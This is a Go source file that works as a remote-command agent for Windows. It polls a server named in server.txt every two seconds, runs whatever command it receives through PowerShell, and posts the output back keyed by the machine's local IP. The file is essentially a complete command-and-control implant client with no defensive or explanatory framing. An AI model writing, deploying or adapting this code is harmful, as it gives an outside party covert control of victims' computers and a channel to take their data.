package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "unknown"
}

func getServerAddr() string {
	data, err := os.ReadFile("server.txt")
	if err != nil {
		return "http://localhost:8080"
	}
	return strings.TrimSpace(string(data))
}

func main() {
	key := getLocalIP()
	serverAddr := getServerAddr()
	fmt.Println("Using server:", serverAddr)
	for {
		resp, err := http.Get(serverAddr + "/getvalue?key=" + key)
		if err != nil {
			fmt.Println("Error requesting getvalue:", err)
			time.Sleep(2 * time.Second)
			continue
		}
		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		var req struct {
			Value  string `json:"value"`
			Output string `json:"output"`
		}
		json.Unmarshal(body, &req)
		if req.Value != "" {
			out, err := exec.Command("powershell", "-Command", req.Value).CombinedOutput()
			if err != nil {
				fmt.Println("Error executing command:", err)
				time.Sleep(2 * time.Second)
				continue
			}
			outputReq := struct {
				Output string `json:"output"`
			}{Output: string(out)}
			outputBody, _ := json.Marshal(outputReq)
			_, err = http.Post(serverAddr+"/setoutput?key="+key, "application/json", bytes.NewBuffer(outputBody))
			if err != nil {
				fmt.Println("Error sending output:", err)
			}
			fmt.Println("Output sent successfully.", time.Now())
		} else {
			// fmt.Println("No command to execute.")
		}
		time.Sleep(2 * time.Second)
	}
}
